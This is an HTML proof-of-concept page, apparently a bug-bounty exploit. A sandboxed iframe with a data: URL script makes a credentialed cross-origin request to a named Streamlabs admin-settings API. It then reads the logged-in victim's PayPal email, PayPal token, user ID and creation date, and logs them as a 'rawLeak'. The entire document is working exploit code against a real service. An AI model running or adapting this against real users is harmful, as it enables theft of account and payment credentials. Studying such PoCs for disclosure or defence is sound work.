<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>

    <iframe
    sandbox="allow-scripts allow-top-navigation allow-forms"
    src='data:text/html,
    <script>
      var url = "https://streamlabs.com/api/v5/merchandise/admin-settings";
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open("get", url, true);
      req.withCredentials = true;
      req.send();

      function reqListener()
      {
         let json_http = this.responseText;
         let json_parsed = JSON.parse(json_http);
         let userData = json_parsed.userStoreSettings.success;
         let userId = userData.settings.user_id;
         let paypalEmail = userData.settings.paypal_email;
         let paypalToken = userData.paypal_token;
         let accountMode = userData.account_type;
         let createdTime = userData.settings.created_at;

         let split = "\r\n";
         let rawLeak = "Email: " + paypalEmail + split + "UserId: " + userId + split + "PaypalToken: " + paypalToken + split + "Created: " + createdTime;
         console.log(rawLeak);
      }
    </script>'>
  </iframe>
  </body>
</html>
